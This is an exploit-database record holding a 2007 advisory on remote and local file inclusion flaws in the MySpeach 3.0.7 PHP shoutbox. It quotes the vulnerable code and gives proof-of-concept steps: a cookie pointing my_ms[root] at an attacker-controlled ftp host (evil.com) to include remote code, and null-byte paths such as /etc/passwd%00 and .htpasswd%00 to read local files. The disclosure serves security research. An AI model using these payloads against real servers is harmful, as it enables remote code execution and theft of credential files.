{
  "id": "3657",
  "title": "MySpeach 3.0.7 - Local/Remote File Inclusion",
  "cve": "CVE-2007-1896",
  "vuln_type": "path_traversal",
  "code": "\t/=======================================\\\r\n\t| Advisory :: MySpeach <= 3.0.7\t\t|\r\n\t+=======================================+---------------------------------------------------------------\\\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t|      Download link : http://www.graphiks.net/scripts-php/script-7-1-0.html\t\t\t\t|\r\n\t|   Official website : www.graphiks.net\t\t\t\t\t\t\t\t\t|\r\n\t|               Type : Chat without any database (only txt files)\t\t\t\t\t|\r\n\t|        Vuln. found : Remote/Local File inclusion (& Full Path Disclosure)\t\t\t\t|\r\n\t| \t  Conditions : Vuln #1 : PHP >= 5.0.0, register_globals = On, allow_url_fopen = On\t\t|\r\n\t|                      Vuln #2 : register_globals = On\t\t\t\t\t\t\t|\r\n\t|\t  Risk level : High\t\t\t\t\t\t\t\t\t\t|\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t+-------------------------------------------------------------------------------------------------------+\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t| Program audited by : Xst3nZ <xst3nz@gmail.com> [fr/en]\t\t\t\t\t\t|\r\n\t|               Date : 2007-04-03\t\t\t\t\t\t\t\t\t|\r\n\t|\t Last update : 2007-04-03\t\t\t\t\t\t\t\t\t|\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t+-------------------------------------------------------------------------------------------------------+\r\n\t| \t     Summary : \t0] Description\t\t\t\t\t\t\t\t\t|\r\n\t|\t\t\t1] Vuln#1 : Remote File Inclusion\t\t\t\t\t\t|\r\n\t|\t\t\t2] Vuln#2 : Local File Inclusion\t\t\t\t\t\t|\r\n\t|\t\t\t3] Links & Documentation\t\t\t\t\t\t\t|\r\n\t\\-------------------------------------------------------------------------------------------------------/\r\n\r\n\t\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <0> DESCRIPTION\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n  MySpeach is a shoutbox coded in PHP which works without any database. Indeed, it uses only text files to save the\r\nmessages. To my mind, it's a good script, but let's see the security, although there was a lot of different versions\r\nto correct vulnerabilities.\r\nSo, the show must g0 on ...\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <1> VULNERABILITY #1 : REMOTE FILE INCLUSION (WITH FULLPATHDISCL)\r\n\r\n  { Cond: PHP>=5.0.0; register_globals=On; allow_url_fopen=On }\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n  Firstly, after the installation, the code which must be put in the page to display the shoutbox MySpeach is the\r\nfollowing :\r\n\r\n+--------8<--------\r\n| <?php\r\n| $my_ms['root']=\"/full/path/myspeach\"; // Contains the realpath of the directory where myspeach is installed\r\n| include($my_ms['root'].'/chat.php'); // Then, the file 'chat.php' is included\r\n| ?>\r\n+--------8<--------\r\n\r\n  Let's see what is it interesting in the file 'chat.php' :\r\n\r\n+--------8<--------\r\n| // [...] line 15\r\n| $clef = ''; $data = '';\r\n| $listedesvariablesensible = array('ip_list', 'my_ms[root]','my_ms[site]','my_ms[absolu_root]','my_ms[msg_txt]',\r\n| 'my_ms[id_unique]','my_ms| [copyright]','my_ms[skin]','my_ms[version]');\r\n| foreach($listedesvariablesensible as $clef => $data)\r\n| {\r\n| \t$afiltrer = $data;\r\n|  \tif(isset($_GET[$afiltrer]) || isset($HTTP_GET_VARS[$afiltrer]))\r\n|  \t{ \r\n|    \t\t$_GET[$afiltrer] = '';\r\n|    \t\t$HTTP_GET_VARS[$afiltrer] = '';\r\n|  \t}\r\n|  \tif(isset($_POST[$afiltrer]) || isset($HTTP_POST_VARS[$afiltrer]))\r\n|  \t{ \r\n|   \t\t$_POST[$afiltrer] = '';\r\n|    \t\t$HTTP_POST_VARS[$afiltrer] = '';\r\n|  \t}\r\n| }\r\n| // Line 32 [...]\r\n+--------8<--------\r\n\r\nSo this code filters all the variables $_GET/$HTTP_GET_VARS and $_POST/$HTTP_POST_VARS with a same name that the\r\nvariables which are used in the script, and it reinitializes their values. However, the vars $_COOKIE are not\r\nfiltered by this code.\r\n\r\n  Besides, we can read the following code :\r\n\r\n+--------8<--------\r\n| // [...] line 35\r\n| if(!@file_exists($my_ms['root'].'/admin/config.php'))\r\n| exit('<br /><p align=\"center\">MySpeach n est pas encore install\u00c3\u00a9.</p>');\r\n|\r\n| //On inclut les fichiers de config (config files are included)\r\n| include($my_ms['root'].'/admin/config.php');\r\n| include($my_ms['root'].'/admin/options.php');\r\n| include($my_ms['root'].'/admin/setup.php');\r\n| include($my_ms['root'].'/admin/fonctions.php');\r\n| // line 45 [...]\r\n+--------8<--------\r\n\r\nThe $my_ms['root'] parameter can be overwritten with a cookie if register_globals = On in the 'php.ini', because\r\n$my_ms['root'] is not initialized (see [1]). Therefore, it can deals a Remote File Inclusion (RFI).\r\nNevertheless, the RMI will work only if the server is running on PHP >= 5 because in this version, the file_exists()\r\nfunction can be used with some URL wrappers (see [2] & [3]) if allow_url_fopen = On in the 'php.ini' (ftp:// can be used for\r\nexample but not http://).\r\n\r\n  +---->> Vuln. #1 Pro0f of Concept <<--------//\r\n  |\r\n  | - Create a cookie : \t| Name  : my_ms[root]\r\n  |\t\t\t\t| Value : ftp://user:password@evil.com\r\n  |\t\t\t\t| Host  : www.victim.com\r\n  | - Create a file called 'config.php' in a folder called 'admin' to obtain a path like that : evil.com/admin/config.php\r\n  | - Then, go on the page : www.victim.com/[myspeach_install_directory(default: myspeach)]/chat.php\r\n  |   * If you get the following error message : \"MySpeach n est pas encore install\u00c3\u00a9.\", the vulnerability cannot be\r\n  |     exploited, probably because the version of PHP is under 5.0.0 and/or register_globals = Off and/or \r\n  |     allow_url_fopen = Off.\r\n  |   * Else, the RFI will work and, in the same time, a lot of inclusion errors will appears because the script try\r\n  |     to include another files like 'admin/options.php', 'admin/setup.php' ... (but the RFI must be done with 'config.php'\r\n  |     because if file_exists($my_ms['root']) return false, the function exit() will be called ...).\r\n  |     Particularly, it sparks a Full Path Disclosure :\r\n  |\r\n  [     Fatal error: Call to undefined function my_MS_plus_un() in /full/path/myspeach/chat.php on line [line]\r\n  |\r\n  +-------------------------------------------\r\n\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <2> VULNERABILITY #2 : LOCAL FILE INCLUSION (WITH FULLPATHDISCL)\r\n\r\n  { Cond: only register_globals=On }\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n  It is also possible to include a local file by using the Null Byte char \\x0 (urlencoded: %00). It will also spark a FullPathDiscl.\r\n\r\n  +---->> Vuln. #2 Pro0f of Concept <<--------\r\n  |\r\n  | - See the Vuln#1 PoC, but change the value of the cookie created, by the path of a local file ended with %00.\r\n  | Example : /etc/passwd%00; ../admin-panel/.htpasswd%00 ... and it will work if register_globals=On\r\n  |\r\n  +-------------------------------------------//\r\n\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <3> LINKS & DOCUMENTATION\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n [1] register_globals Security\r\n\thttp://www.php.net/manual/it/security.globals.php\r\n\r\n [2] file_exists() function\r\n\thttp://www.php.net/manual/en/function.file-exists.php\r\n\r\n [3] List of Supported Protocols/Wrappers\r\n\thttp://www.php.net/manual/en/wrappers.ftp.php\r\n\tand especially for FTP/FTPS: http://www.php.net/manual/en/wrappers.ftp.php\r\n\t(we also learn that HTTP/HTTPS protocols aren't supported by stat() and so, by file_exists() : \r\n\thttp://www.php.net/manual/en/wrappers.http.php)\r\n\r\n\r\n// [EOF] Xst3nZ\r\n\r\n# milw0rm.com [2007-04-03]",
  "url": "https://www.exploit-db.com/exploits/3657"
}